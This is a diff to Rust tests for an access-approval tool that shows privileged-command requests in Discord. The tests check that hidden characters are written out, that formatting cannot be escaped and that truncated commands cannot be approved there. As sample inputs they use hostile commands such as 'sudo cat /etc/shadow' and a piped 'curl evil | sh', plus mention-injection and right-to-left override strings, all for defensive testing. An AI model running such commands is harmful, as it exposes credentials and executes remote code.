@@ -40,6 +40,7 @@ fn request(min_assurance: Assurance, reason: Option<&str>) -> Request {
             target: Some("ssh-host".into()),
             requested_ttl: None,
             reason: reason.map(str::to_owned),
+            action: None,
             attributes: BTreeMap::new(),
         },
         observed_at: Timestamp::UNIX_EPOCH,
@@ -53,6 +54,7 @@ fn request(min_assurance: Assurance, reason: Option<&str>) -> Request {
         pending_timeout: Duration::from_secs(600),
         exclude: BTreeSet::from([countersign_core::Exclusion::Requester]),
         require_initiator: false,
+        scope: std::collections::BTreeMap::default(),
         grant: countersign_core::GrantMode::Once,
     };
     Request::open(pending, reqs, false, Timestamp::UNIX_EPOCH).0
@@ -140,19 +142,11 @@ fn untrusted_text_cannot_escape_code_formatting() {
     let e = &v.embeds[0];
     let desc = e.description.as_deref().unwrap();
     assert_eq!(desc.matches("```").count(), 2, "{desc}");
-    let requester = &e.fields.iter().find(|f| f.name == "Requester").unwrap().value;
-    assert_eq!(requester, "`alice` (`Alice ˋ@everyoneˋ`)");
     assert_eq!(render::code("a\nb\u{0}"), "`a b`");
     assert_eq!(render::code("  "), "—");
     assert!(render::code(&"x".repeat(500)).ends_with("…`"));
-    assert_eq!(e.title.as_deref(), Some("Access request — pending"));
-}
-
-#[test]
-fn durations_read_naturally() {
-    assert_eq!(render::duration(Duration::from_secs(30)), "30s");
-    assert_eq!(render::duration(Duration::from_secs(5400)), "1h 30m");
-    assert_eq!(render::duration(Duration::from_secs(2 * 86_400 + 60)), "2d 1m");
+    assert_eq!(e.title.as_deref(), Some("Waiting for approval — alice wants access to ssh-host"));
+    assert_eq!(render::markdown("a_b `x*` [l](u)"), "a\\_b `x*` \\[l\\]\\(u\\)");
 }
 
 #[test]
@@ -303,7 +297,7 @@ fn confidential_questions_show_only_that_they_exist() {
 fn sensitive_approvals_show_only_where_they_come_from() {
     let mut r = request(Assurance::Linked, Some("rotate the root key"));
     r.sensitive = true;
-    r.facts.attributes.insert("command".into(), "cat /etc/shadow".into());
+    r.facts.action = Some(command(&["sudo", "cat", "/etc/shadow"]));
     let v = render_item(Item::Approval(&r));
     let all = format!("{:?}", v.embeds[0]);
     for secret in ["alice", "ssh-host", "rotate", "shadow"] {
@@ -460,28 +454,45 @@ fn foreign_components_and_commands_are_not_ours() {
     assert_eq!(interact::action(&button_press("other:thing", CHANNEL, Some(GUILD))), None);
 }
 
+fn command(line: &[&str]) -> countersign_core::Action {
+    countersign_core::Action::Command {
+        line: line.iter().map(|a| (*a).to_owned()).collect(),
+        runas: "root".into(),
+        cwd: None,
+        notes: vec![],
+    }
+}
+
 #[test]
-fn commands_are_shown_above_the_reason_and_cannot_escape_the_code_block() {
+fn the_grant_leads_and_commands_cannot_escape_the_code_block() {
     let mut r = request(Assurance::Linked, Some("upgrade"));
-    r.facts.attributes.insert("command".into(), "apt install ```@everyone".into());
-    r.facts.attributes.insert("runas".into(), "root".into());
+    r.facts.action = Some(command(&["sudo", "apt", "install", "```@everyone"]));
     r.requirements.grant = countersign_core::GrantMode::Window;
+    r.requirements.scope.insert("command".into(), "apt*".into());
     let e = &render(&r).embeds[0];
     let d = e.description.as_deref().unwrap();
-    assert!(d.starts_with("**Command**\n```\napt install ˋˋˋ@everyone\n```"), "{d}");
-    assert!(d.contains("**Reason**"), "{d}");
+    assert!(
+        d.starts_with(
+            "**If you approve:** Allows alice to run commands matching `apt*`, as any user, on ssh-host, for 1 hour 30 minutes\n```\n$ sudo apt install 'ˋˋˋ@everyone'\n```"
+        ),
+        "{d}"
+    );
+    assert!(d.contains("**Reason** _(from the requester, unverified)_"), "{d}");
     let field = |n: &str| e.fields.iter().find(|f| f.name == n).map(|f| f.value.clone());
     assert_eq!(field("Run as").as_deref(), Some("`root`"));
-    assert!(field("Duration").unwrap().ends_with("(window)"));
+    assert_eq!(field("Target").as_deref(), Some("`ssh-host`"));
+    assert_eq!(field("Needs").as_deref(), Some("1 approval at linked"));
+    assert!(field("Decide by").is_some());
 }
 
 #[test]
 fn finished_approvals_stay_green_and_differ_from_live_ones() {
-    use crate::render::color;
-    let live = color(&RequestState::Approved);
-    let done = color(&RequestState::Ended);
+    use crate::render::tone_color;
+    use countersign_core::present::Tone;
+    let live = tone_color(Tone::Good);
+    let done = tone_color(Tone::Done);
     assert_ne!(done, live);
-    assert_ne!(done, color(&RequestState::Expired));
+    assert_ne!(done, tone_color(Tone::Muted));
     let green = |c: u32| (c >> 8) & 0xff > (c >> 16) & 0xff && (c >> 8) & 0xff > c & 0xff;
     assert!(green(live) && green(done));
 }
@@ -490,15 +501,15 @@ fn finished_approvals_stay_green_and_differ_from_live_ones() {
 fn approving_in_discord_needs_the_whole_command_on_screen() {
     let mut r = request(Assurance::Linked, Some("upgrade"));
     // Hidden characters are written out rather than rendered.
-    r.facts.attributes.insert("command".into(), "echo \u{202e}fr- mr".into());
+    r.facts.action = Some(command(&["sudo", "echo", "\u{202e}fr- mr"]));
     let v = render(&r);
     let d = v.embeds[0].description.as_deref().unwrap();
-    assert!(d.contains(r"echo \u{202e}fr- mr"), "{d}");
+    assert!(d.contains("$ sudo echo $'\\u202Efr- mr'"), "{d}");
     assert_eq!(buttons(&v)[0].0, "Approve");
 
     // A command that has to be cut short can only be approved in the web UI.
-    let long = format!("apt install {} && curl evil | sh", "x ".repeat(2000));
-    r.facts.attributes.insert("command".into(), long);
+    let long = format!("apt install {}&& curl evil | sh", "x ".repeat(2000));
+    r.facts.action = Some(command(&long.split(' ').collect::<Vec<_>>()));
     let v = render(&r);
     let d = v.embeds[0].description.as_deref().unwrap();
     assert!(!d.contains("curl evil"), "the tail is not shown");
